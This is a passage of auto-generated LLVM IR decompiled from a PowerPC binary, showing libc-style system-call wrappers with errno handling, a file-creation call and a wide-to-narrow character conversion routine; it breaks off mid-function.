  uselistorder label %dec_label_pc_10009744, { 1, 0 }
}

define i32 @function_10009758() local_unnamed_addr {
dec_label_pc_10009758:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009770 = call i32 @__asm_mfcr()
  %v1_10009774 = and i32 %v0_10009770, 268435456
  %v3_10009774 = icmp eq i32 %v1_10009774, 0
  store i32 %v0_10009770, i32* %r31.global-to-local, align 4
  br i1 %v3_10009774, label %dec_label_pc_1000978c, label %dec_label_pc_10009780

dec_label_pc_10009780:                            ; preds = %dec_label_pc_10009758
  %v0_10009780 = call i32 @function_10004e38()
  %v0_10009784 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009784 = inttoptr i32 %v0_10009780 to i32*
  store i32 %v0_10009784, i32* %v2_10009784, align 4
  br label %dec_label_pc_1000978c

dec_label_pc_1000978c:                            ; preds = %dec_label_pc_10009758, %dec_label_pc_10009780
  %v0_1000979c = phi i32 [ %v0_10009770, %dec_label_pc_10009758 ], [ -1, %dec_label_pc_10009780 ]
  ret i32 %v0_1000979c

; uselistorder directives
  uselistorder label %dec_label_pc_1000978c, { 1, 0 }
}

define i32 @function_100097a0() local_unnamed_addr {
dec_label_pc_100097a0:
  %r31.global-to-local = alloca i32, align 4
  %v0_100097b8 = call i32 @__asm_mfcr()
  %v1_100097bc = and i32 %v0_100097b8, 268435456
  %v3_100097bc = icmp eq i32 %v1_100097bc, 0
  store i32 %v0_100097b8, i32* %r31.global-to-local, align 4
  br i1 %v3_100097bc, label %dec_label_pc_100097d4, label %dec_label_pc_100097c8

dec_label_pc_100097c8:                            ; preds = %dec_label_pc_100097a0
  %v0_100097c8 = call i32 @function_10004e38()
  %v0_100097cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100097cc = inttoptr i32 %v0_100097c8 to i32*
  store i32 %v0_100097cc, i32* %v2_100097cc, align 4
  br label %dec_label_pc_100097d4

dec_label_pc_100097d4:                            ; preds = %dec_label_pc_100097a0, %dec_label_pc_100097c8
  %v0_100097e4 = phi i32 [ %v0_100097b8, %dec_label_pc_100097a0 ], [ -1, %dec_label_pc_100097c8 ]
  ret i32 %v0_100097e4

; uselistorder directives
  uselistorder label %dec_label_pc_100097d4, { 1, 0 }
}

define i32 @function_100097e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100097e8:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009800 = call i32 @__asm_mfcr()
  %v1_10009804 = and i32 %v0_10009800, 268435456
  %v3_10009804 = icmp eq i32 %v1_10009804, 0
  store i32 %v0_10009800, i32* %r31.global-to-local, align 4
  br i1 %v3_10009804, label %dec_label_pc_1000981c, label %dec_label_pc_10009810

dec_label_pc_10009810:                            ; preds = %dec_label_pc_100097e8
  %v0_10009810 = call i32 @function_10004e38()
  %v0_10009814 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009814 = inttoptr i32 %v0_10009810 to i32*
  store i32 %v0_10009814, i32* %v2_10009814, align 4
  br label %dec_label_pc_1000981c

dec_label_pc_1000981c:                            ; preds = %dec_label_pc_100097e8, %dec_label_pc_10009810
  %v0_1000982c = phi i32 [ %v0_10009800, %dec_label_pc_100097e8 ], [ -1, %dec_label_pc_10009810 ]
  ret i32 %v0_1000982c

; uselistorder directives
  uselistorder label %dec_label_pc_1000981c, { 1, 0 }
}

define i32 @function_10009830(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009830:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009848 = call i32 @__asm_mfcr()
  %v1_1000984c = and i32 %v0_10009848, 268435456
  %v3_1000984c = icmp eq i32 %v1_1000984c, 0
  store i32 %v0_10009848, i32* %r31.global-to-local, align 4
  br i1 %v3_1000984c, label %dec_label_pc_10009864, label %dec_label_pc_10009858

dec_label_pc_10009858:                            ; preds = %dec_label_pc_10009830
  %v0_10009858 = call i32 @function_10004e38()
  %v0_1000985c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000985c = inttoptr i32 %v0_10009858 to i32*
  store i32 %v0_1000985c, i32* %v2_1000985c, align 4
  br label %dec_label_pc_10009864

dec_label_pc_10009864:                            ; preds = %dec_label_pc_10009830, %dec_label_pc_10009858
  %v0_10009874 = phi i32 [ %v0_10009848, %dec_label_pc_10009830 ], [ -1, %dec_label_pc_10009858 ]
  ret i32 %v0_10009874

; uselistorder directives
  uselistorder label %dec_label_pc_10009864, { 1, 0 }
}

define i32 @function_10009878(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009878:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009890 = call i32 @__asm_mfcr()
  %v1_10009894 = and i32 %v0_10009890, 268435456
  %v3_10009894 = icmp eq i32 %v1_10009894, 0
  store i32 %v0_10009890, i32* %r31.global-to-local, align 4
  br i1 %v3_10009894, label %dec_label_pc_100098ac, label %dec_label_pc_100098a0

dec_label_pc_100098a0:                            ; preds = %dec_label_pc_10009878
  %v0_100098a0 = call i32 @function_10004e38()
  %v0_100098a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100098a4 = inttoptr i32 %v0_100098a0 to i32*
  store i32 %v0_100098a4, i32* %v2_100098a4, align 4
  br label %dec_label_pc_100098ac

dec_label_pc_100098ac:                            ; preds = %dec_label_pc_10009878, %dec_label_pc_100098a0
  %v0_100098bc = phi i32 [ %v0_10009890, %dec_label_pc_10009878 ], [ -1, %dec_label_pc_100098a0 ]
  ret i32 %v0_100098bc

; uselistorder directives
  uselistorder label %dec_label_pc_100098ac, { 1, 0 }
}

define i32 @function_100098c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100098c0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100098d0 = and i32 %arg2, 64
  %v3_100098d0 = icmp eq i32 %v1_100098d0, 0
  br i1 %v3_100098d0, label %dec_label_pc_10009900, label %dec_label_pc_100098e4

dec_label_pc_100098e4:                            ; preds = %dec_label_pc_100098c0
  %v2_100098ec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100098ec, i32* %stack_var_-32, align 4
  %v0_100098fc = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009900

dec_label_pc_10009900:                            ; preds = %dec_label_pc_100098c0, %dec_label_pc_100098e4
  %v0_10009900 = phi i32 [ 0, %dec_label_pc_100098c0 ], [ %v0_100098fc, %dec_label_pc_100098e4 ]
  store i32 %v0_10009900, i32* @r5, align 4
  %v0_10009908 = call i32 @__asm_mfcr()
  %v1_1000990c = and i32 %v0_10009908, 268435456
  %v3_1000990c = icmp eq i32 %v1_1000990c, 0
  store i32 %v0_10009908, i32* %r31.global-to-local, align 4
  br i1 %v3_1000990c, label %dec_label_pc_10009924, label %dec_label_pc_10009918

dec_label_pc_10009918:                            ; preds = %dec_label_pc_10009900
  %v0_10009918 = call i32 @function_10004e38()
  %v0_1000991c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000991c = inttoptr i32 %v0_10009918 to i32*
  store i32 %v0_1000991c, i32* %v2_1000991c, align 4
  br label %dec_label_pc_10009924

dec_label_pc_10009924:                            ; preds = %dec_label_pc_10009900, %dec_label_pc_10009918
  %v0_10009934 = phi i32 [ %v0_10009908, %dec_label_pc_10009900 ], [ -1, %dec_label_pc_10009918 ]
  ret i32 %v0_10009934

; uselistorder directives
  uselistorder label %dec_label_pc_10009924, { 1, 0 }
  uselistorder label %dec_label_pc_10009900, { 1, 0 }
}

define i32 @function_10009938(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009938:
  store i32 %arg1, i32* @r5, align 4
  %v2_10009944 = call i32 @function_100098c0(i32 577, i32 577)
  ret i32 %v2_10009944

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100098c0, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @function_10009948(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009948:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009960 = call i32 @__asm_mfcr()
  %v1_10009964 = and i32 %v0_10009960, 268435456
  %v3_10009964 = icmp eq i32 %v1_10009964, 0
  store i32 %v0_10009960, i32* %r31.global-to-local, align 4
  br i1 %v3_10009964, label %dec_label_pc_1000997c, label %dec_label_pc_10009970

dec_label_pc_10009970:                            ; preds = %dec_label_pc_10009948
  %v0_10009970 = call i32 @function_10004e38()
  %v0_10009974 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009974 = inttoptr i32 %v0_10009970 to i32*
  store i32 %v0_10009974, i32* %v2_10009974, align 4
  br label %dec_label_pc_1000997c

dec_label_pc_1000997c:                            ; preds = %dec_label_pc_10009948, %dec_label_pc_10009970
  %v0_1000998c = phi i32 [ %v0_10009960, %dec_label_pc_10009948 ], [ -1, %dec_label_pc_10009970 ]
  ret i32 %v0_1000998c

; uselistorder directives
  uselistorder label %dec_label_pc_1000997c, { 1, 0 }
}

define i32 @function_10009990(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009990:
  store i32 %arg1, i32* @r30, align 4
  %v3_100099ac = load i32, i32* @global_var_100104dc.298, align 4
  %v3_100099b0 = icmp eq i32 %v3_100099ac, 0
  br i1 %v3_100099b0, label %dec_label_pc_100099b8, label %dec_label_pc_100099c4

dec_label_pc_100099b8:                            ; preds = %dec_label_pc_10009990
  store i32 268474812, i32* @lr, align 4
  %v1_100099b8 = call i32 @function_1000bab4(i32 0)
  %v1_100099bc = icmp slt i32 %v1_100099b8, 0
  br i1 %v1_100099bc, label %dec_label_pc_100099ec, label %dec_label_pc_100099b8.dec_label_pc_100099c4_crit_edge

dec_label_pc_100099b8.dec_label_pc_100099c4_crit_edge: ; preds = %dec_label_pc_100099b8
  %v0_100099c4.pre = load i32, i32* @r30, align 4
  %v3_100099c8.pre = load i32, i32* @global_var_100104dc.298, align 4
  br label %dec_label_pc_100099c4

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_100099b8.dec_label_pc_100099c4_crit_edge, %dec_label_pc_10009990
  %v3_100099c8 = phi i32 [ %v3_100099c8.pre, %dec_label_pc_100099b8.dec_label_pc_100099c4_crit_edge ], [ %v3_100099ac, %dec_label_pc_10009990 ]
  %v1_100099dc = phi i32 [ %v0_100099c4.pre, %dec_label_pc_100099b8.dec_label_pc_100099c4_crit_edge ], [ %arg1, %dec_label_pc_10009990 ]
  %v3_100099c4 = icmp eq i32 %v1_100099dc, 0
  store i32 %v3_100099c8, i32* @r31, align 4
  br i1 %v3_100099c4, label %dec_label_pc_100099f0, label %dec_label_pc_100099d8

dec_label_pc_100099d8:                            ; preds = %dec_label_pc_100099c4
  %v2_100099dc = add i32 %v1_100099dc, %v3_100099c8
  store i32 268474852, i32* @lr, align 4
  %v1_100099e0 = call i32 @function_1000bab4(i32 %v2_100099dc)
  %tmp6 = icmp sgt i32 %v1_100099e0, -1
  br i1 %tmp6, label %dec_label_pc_100099d8.dec_label_pc_100099f0_crit_edge, label %dec_label_pc_100099ec

dec_label_pc_100099d8.dec_label_pc_100099f0_crit_edge: ; preds = %dec_label_pc_100099d8
  %v0_100099f4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099f0

dec_label_pc_100099ec:                            ; preds = %dec_label_pc_100099d8, %dec_label_pc_100099b8
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_100099f0

dec_label_pc_100099f0:                            ; preds = %dec_label_pc_100099d8.dec_label_pc_100099f0_crit_edge, %dec_label_pc_100099c4, %dec_label_pc_100099ec
  %v0_100099f4 = phi i32 [ %v0_100099f4.pre, %dec_label_pc_100099d8.dec_label_pc_100099f0_crit_edge ], [ %v3_100099c8, %dec_label_pc_100099c4 ], [ -1, %dec_label_pc_100099ec ]
  ret i32 %v0_100099f4

; uselistorder directives
  uselistorder i32 %v3_100099c8, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1000bab4, { 1, 0 }
  uselistorder label %dec_label_pc_100099f0, { 2, 0, 1 }
}

define i32 @function_10009a08(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009a08:
  %r31.global-to-local = alloca i32, align 4
  %v3_10009a10 = icmp eq i32 %arg2, 0
  br i1 %v3_10009a10, label %dec_label_pc_10009a48, label %dec_label_pc_10009a30

dec_label_pc_10009a30:                            ; preds = %dec_label_pc_10009a08
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10009a48, label %dec_label_pc_10009a38

dec_label_pc_10009a38:                            ; preds = %dec_label_pc_10009a30
  %v0_10009a38 = call i32 @function_10004e38()
  %v2_10009a40 = inttoptr i32 %v0_10009a38 to i32*
  store i32 22, i32* %v2_10009a40, align 4
  %v0_10009a6c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009a68

dec_label_pc_10009a48:                            ; preds = %dec_label_pc_10009a30, %dec_label_pc_10009a08
  %v0_10009a4c = call i32 @__asm_mfcr()
  %v1_10009a50 = and i32 %v0_10009a4c, 268435456
  %v3_10009a50 = icmp eq i32 %v1_10009a50, 0
  store i32 %v0_10009a4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009a50, label %dec_label_pc_10009a68, label %dec_label_pc_10009a5c

dec_label_pc_10009a5c:                            ; preds = %dec_label_pc_10009a48
  %v0_10009a5c = call i32 @function_10004e38()
  %v0_10009a60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009a60 = inttoptr i32 %v0_10009a5c to i32*
  store i32 %v0_10009a60, i32* %v2_10009a60, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009a68

dec_label_pc_10009a68:                            ; preds = %dec_label_pc_10009a48, %dec_label_pc_10009a38, %dec_label_pc_10009a5c
  %v0_10009a6c = phi i32 [ %v0_10009a4c, %dec_label_pc_10009a48 ], [ %v0_10009a6c.pre, %dec_label_pc_10009a38 ], [ -1, %dec_label_pc_10009a5c ]
  ret i32 %v0_10009a6c

; uselistorder directives
  uselistorder label %dec_label_pc_10009a68, { 2, 0, 1 }
}

define i32 @function_10009a80(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009a80:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009a98 = call i32 @__asm_mfcr()
  %v1_10009a9c = and i32 %v0_10009a98, 268435456
  %v3_10009a9c = icmp eq i32 %v1_10009a9c, 0
  store i32 %v0_10009a98, i32* %r31.global-to-local, align 4
  br i1 %v3_10009a9c, label %dec_label_pc_10009ab4, label %dec_label_pc_10009aa8

dec_label_pc_10009aa8:                            ; preds = %dec_label_pc_10009a80
  %v0_10009aa8 = call i32 @function_10004e38()
  %v0_10009aac = load i32, i32* %r31.global-to-local, align 4
  %v2_10009aac = inttoptr i32 %v0_10009aa8 to i32*
  store i32 %v0_10009aac, i32* %v2_10009aac, align 4
  br label %dec_label_pc_10009ab4

dec_label_pc_10009ab4:                            ; preds = %dec_label_pc_10009a80, %dec_label_pc_10009aa8
  %v0_10009ac4 = phi i32 [ %v0_10009a98, %dec_label_pc_10009a80 ], [ -1, %dec_label_pc_10009aa8 ]
  ret i32 %v0_10009ac4

; uselistorder directives
  uselistorder label %dec_label_pc_10009ab4, { 1, 0 }
}

define i32 @function_10009ac8() local_unnamed_addr {
dec_label_pc_10009ac8:
  ret i32 ptrtoint (i32* @global_var_100104c0.300 to i32)
}

define i32 @function_10009ad4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009ad4:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10009adc = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10009af0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10009af0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10009adc, label %dec_label_pc_10009afc, label %dec_label_pc_10009b04

dec_label_pc_10009afc:                            ; preds = %dec_label_pc_10009ad4
  %v2_10009afc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009afc, i32* @r3, align 4
  br label %dec_label_pc_10009b04

dec_label_pc_10009b04:                            ; preds = %dec_label_pc_10009ad4, %dec_label_pc_10009afc
  %v0_10009b08 = phi i32 [ %arg2, %dec_label_pc_10009ad4 ], [ 0, %dec_label_pc_10009afc ]
  %v2_10009b04 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10009b08, i32* %stack_var_-40, align 4
  store i32 %v2_10009b04, i32* %stack_var_-36, align 4
  store i32 268475156, i32* @lr, align 4
  %v0_10009b10 = call i32 @function_10009b40()
  %v3_10009b14 = icmp eq i32 %v0_10009b10, 0
  br i1 %v3_10009b14, label %dec_label_pc_10009b1c, label %dec_label_pc_10009b20

dec_label_pc_10009b1c:                            ; preds = %dec_label_pc_10009b04
  br label %dec_label_pc_10009b20

dec_label_pc_10009b20:                            ; preds = %dec_label_pc_10009b04, %dec_label_pc_10009b1c
  %v0_10009b2c = phi i32 [ %v0_10009b10, %dec_label_pc_10009b04 ], [ 1, %dec_label_pc_10009b1c ]
  ret i32 %v0_10009b2c

; uselistorder directives
  uselistorder label %dec_label_pc_10009b20, { 1, 0 }
  uselistorder label %dec_label_pc_10009b04, { 1, 0 }
}

define i32 @function_10009b30() local_unnamed_addr {
dec_label_pc_10009b30:
  %v0_10009b34 = load i32, i32* @r5, align 4
  store i32 %v0_10009b34, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10009b3c = call i32 @function_10009b40()
  ret i32 %v0_10009b3c

; uselistorder directives
  uselistorder i32 ()* @function_10009b40, { 1, 0 }
}

define i32 @function_10009b40() local_unnamed_addr {
dec_label_pc_10009b40:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10009b44 = load i32, i32* @lr, align 4
  store i32 %v0_10009b44, i32* %r0.global-to-local, align 4
  %v0_10009b48 = load i32, i32* @r3, align 4
  %v3_10009b48 = icmp eq i32 %v0_10009b48, 0
  br i1 %v3_10009b48, label %dec_label_pc_10009b6c, label %dec_label_pc_10009b54

dec_label_pc_10009b54:                            ; preds = %dec_label_pc_10009b40
  %v1_10009b54 = load i32, i32* @r4, align 4
  %v4_10009b54 = icmp eq i32 %v0_10009b48, %v1_10009b54
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10009b54, label %dec_label_pc_10009b60, label %dec_label_pc_10009b98

dec_label_pc_10009b60:                            ; preds = %dec_label_pc_10009b54
  %v2_10009b64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009b64, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009b98

dec_label_pc_10009b6c:                            ; preds = %dec_label_pc_10009b40
  %v2_10009b6411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009b6411, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10009b98

dec_label_pc_10009b78:                            ; preds = %dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge, %dec_label_pc_10009bb8.preheader
  %v0_10009b78 = call i32 @function_10004e38()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10009b84 = inttoptr i32 %v0_10009b78 to i32*
  store i32 84, i32* %v2_10009b84, align 4
  %v0_10009bfc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009bf8

dec_label_pc_10009b8c:                            ; preds = %dec_label_pc_10009bc8
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10009be8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009be4

dec_label_pc_10009b98:                            ; preds = %dec_label_pc_10009b60, %dec_label_pc_10009b54, %dec_label_pc_10009b6c
  %v2_10009bc87 = phi i32 [ %v2_10009b64, %dec_label_pc_10009b60 ], [ %v0_10009b48, %dec_label_pc_10009b54 ], [ %v2_10009b6411, %dec_label_pc_10009b6c ]
  %v0_10009b98 = load i32, i32* @r5, align 4
  %v1_10009b98 = load i32, i32* @r6, align 4
  %v3_10009b98 = icmp ugt i32 %v0_10009b98, %v1_10009b98
  br i1 %v3_10009b98, label %dec_label_pc_10009ba0, label %dec_label_pc_10009ba4

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b98
  store i32 %v1_10009b98, i32* @r5, align 4
  br label %dec_label_pc_10009ba4

dec_label_pc_10009ba4:                            ; preds = %dec_label_pc_10009b98, %dec_label_pc_10009ba0
  %v0_10009bb0 = phi i32 [ %v0_10009b98, %dec_label_pc_10009b98 ], [ %v1_10009b98, %dec_label_pc_10009ba0 ]
  %v1_10009ba4 = add i32 %v0_10009bb0, 1
  store i32 %v1_10009ba4, i32* %r0.global-to-local, align 4
  %v0_10009ba8 = load i32, i32* @r4, align 4
  %v1_10009ba8 = inttoptr i32 %v0_10009ba8 to i32*
  %v2_10009ba8 = load i32, i32* %v1_10009ba8, align 4
  store i32 %v2_10009ba8, i32* %r11.global-to-local, align 4
  store i32 %v0_10009bb0, i32* %r9.global-to-local, align 4
  store i32 %v0_10009bb0, i32* %ctr.global-to-local, align 4
  %v2_10009be03 = icmp eq i32 %v0_10009bb0, 0
  br i1 %v2_10009be03, label %dec_label_pc_10009be4, label %dec_label_pc_10009bb8.preheader

dec_label_pc_10009bb8.preheader:                  ; preds = %dec_label_pc_10009ba4
  %v1_10009bb816 = inttoptr i32 %v2_10009ba8 to i32*
  %v2_10009bb817 = load i32, i32* %v1_10009bb816, align 4
  store i32 %v2_10009bb817, i32* %r0.global-to-local, align 4
  %v1_10009bbc18 = add i32 %v2_10009ba8, 4
  store i32 %v1_10009bbc18, i32* %r11.global-to-local, align 4
  %v2_10009bc020 = icmp ugt i32 %v2_10009bb817, 127
  br i1 %v2_10009bc020, label %dec_label_pc_10009b78, label %dec_label_pc_10009bc8.lr.ph

dec_label_pc_10009bc8.lr.ph:                      ; preds = %dec_label_pc_10009bb8.preheader
  %extract.t = trunc i32 %v2_10009bb817 to i8
  br label %dec_label_pc_10009bc8

dec_label_pc_10009bc8:                            ; preds = %dec_label_pc_10009bc8.lr.ph, %dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge
  %v2_10009bb823.off0 = phi i8 [ %extract.t, %dec_label_pc_10009bc8.lr.ph ], [ %extract.t24, %dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge ]
  %v2_10009bc822 = phi i32 [ %v2_10009bc87, %dec_label_pc_10009bc8.lr.ph ], [ %v2_10009bd8, %dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge ]
  %v3_10009bc8 = inttoptr i32 %v2_10009bc822 to i8*
  store i8 %v2_10009bb823.off0, i8* %v3_10009bc8, align 1
  %v0_10009bcc = load i32, i32* %r0.global-to-local, align 4
  %v1_10009bcc = urem i32 %v0_10009bcc, 256
  store i32 %v1_10009bcc, i32* %r0.global-to-local, align 4
  %v3_10009bd0 = icmp eq i32 %v1_10009bcc, 0
  br i1 %v3_10009bd0, label %dec_label_pc_10009b8c, label %dec_label_pc_10009bd8

dec_label_pc_10009bd8:                            ; preds = %dec_label_pc_10009bc8
  %v0_10009bd8 = load i32, i32* @r3, align 4
  %v1_10009bd8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009bd8 = add i32 %v1_10009bd8, %v0_10009bd8
  store i32 %v2_10009bd8, i32* @r3, align 4
  %v0_10009bdc = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bdc = add i32 %v0_10009bdc, -1
  store i32 %v1_10009bdc, i32* %r9.global-to-local, align 4
  %v0_10009be0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009be0 = add i32 %v0_10009be0, -1
  store i32 %v1_10009be0, i32* %ctr.global-to-local, align 4
  %v2_10009be0 = icmp eq i32 %v1_10009be0, 0
  br i1 %v2_10009be0, label %dec_label_pc_10009be4, label %dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge

dec_label_pc_10009bd8.dec_label_pc_10009bb8_crit_edge: ; preds = %dec_label_pc_10009bd8
  %v0_10009bb8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bb8 = inttoptr i32 %v0_10009bb8.pre to i32*
  %v2_10009bb8 = load i32, i32* %v1_10009bb8, align 4
  store i32 %v2_10009bb8, i32* %r0.global-to-local, align 4
  %v1_10009bbc = add i32 %v0_10009bb8.pre, 4
  store i32 %v1_10009bbc, i32* %r11.global-to-local, align 4
  %v2_10009bc0 = icmp ugt i32 %v2_10009bb8, 127
  %extract.t24 = trunc i32 %v2_10009bb8 to i8
  br i1 %v2_10009bc0, label %dec_label_pc_10009b78, label %dec_label_pc_10009bc8

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bd8, %dec_label_pc_10009ba4, %dec_label_pc_10009b8c
  %v0_10009be8 = phi i32 [ %v0_10009be8.pre, %dec_label_pc_10009b8c ], [ %v2_10009bc87, %dec_label_pc_10009ba4 ], [ %v2_10009bd8, %dec_label_pc_10009bd8 ]
  %v2_10009be4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009be4, i32* %r0.global-to-local, align 4
  %v4_10009be8 = icmp eq i32 %v0_10009be8, %v2_10009be4
  br i1 %v4_10009be8, label %dec_label_pc_10009bf4, label %dec_label_pc_10009bf0

dec_label_pc_10009bf0:                            ; preds = %dec_label_pc_10009be4
  %v0_10009bf0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bf0 = load i32, i32* @r4, align 4
  %v2_10009bf0 = inttoptr i32 %v1_10009bf0 to i32*
  store i32 %v0_10009bf0, i32* %v2_10009bf0, align 4
  br label %dec_label_pc_10009bf4

dec_label_pc_10009bf4:                            ; preds = %dec_label_pc_10009be4, %dec_label_pc_10009bf0
  %v0_10009bf4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009bf4 = load i32, i32* @r5, align 4
  %v2_10009bf4 = sub i32 %v1_10009bf4, %v0_10009bf4
  store i32 %v2_10009bf4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009bf8

dec_label_pc_10009bf8:                            ; preds = %dec_label_pc_10009b78, %dec_label_pc_10009bf4
  %v0_10009bfc = phi i32 [ %v0_10009bfc.pre, %dec_label_pc_10009b78 ], [ %v2_10009bf4, %dec_label_pc_10009bf4 ]
  store i32 %v0_10009b44, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009bfc

; uselistorder directives
  uselistorder i32 %v1_10009be0, { 1, 0 }
  uselistorder i32 %v2_10009bd8, { 0, 2, 1 }
  uselistorder i32 %v1_10009bcc, { 1, 0 }
  uselistorder i32 %v0_10009bb0, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10009bc87, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10009bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10009bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10009b98, { 2, 0, 1 }
}

define i32 @function_10009c0c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009c0c:
  %v0_10009c10 = load i32, i32* @lr, align 4
  store i32 268475440, i32* @lr, align 4
  %v2_10009c2c = call i32 @function_100095a4(i32 3, i32 3)
  %v3_10009c30 = icmp eq i32 %v2_10009c2c, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_10009c30, label %dec_label_pc_10009c58, label %dec_label_pc_10009c44

dec_label_pc_10009c44:                            ; preds = %dec_label_pc_10009c0c
  store i32 %v0_10009c10, i32* @lr, align 4
  %v4_10009c54 = inttoptr i32 %arg2 to i8*
  %v5_10009c54 = call i32 @function_10005434(i32 %v2_10009c2c, i8* %v4_10009c54)
  br label %dec_label_pc_10009c58

dec_label_pc_10009c58:                            ; preds = %dec_label_pc_10009c0c, %dec_label_pc_10009c44
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100095a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009c58, { 1, 0 }
}

define i32 @function_10009c70(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009c70:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10009c74 = load i32, i32* @lr, align 4
  store i32 %v0_10009c74, i32* %r0.global-to-local, align 4
  %v0_10009c80 = load i32, i32* @r5, align 4
  store i32 %v0_10009c80, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10009c80, i32* @r31, align 4
  %v3_10009c903 = icmp eq i32 %v0_10009c80, 0
  br i1 %v3_10009c903, label %dec_label_pc_10009d38, label %dec_label_pc_10009c9c

